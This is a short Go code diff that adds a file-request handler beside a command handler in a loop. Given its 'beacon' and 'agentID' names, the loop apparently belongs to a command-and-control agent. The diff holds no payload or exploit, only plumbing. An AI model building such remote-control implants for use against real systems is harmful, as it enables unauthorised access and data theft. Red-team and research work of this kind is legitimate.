@@ -44,6 +44,11 @@ func main() {
 			continue
 		}
 
+		if err := client_utils.HandleFileRequest(beacon, encoder, decoder, agentID); err != nil {
+			client_utils.HandleError(beacon, "file", err)
+			continue
+		}
+
 		if err := handleCommandRequest(beacon, encoder, decoder, agentID); err != nil {
 			client_utils.HandleError(beacon, "command", err)
 			continue
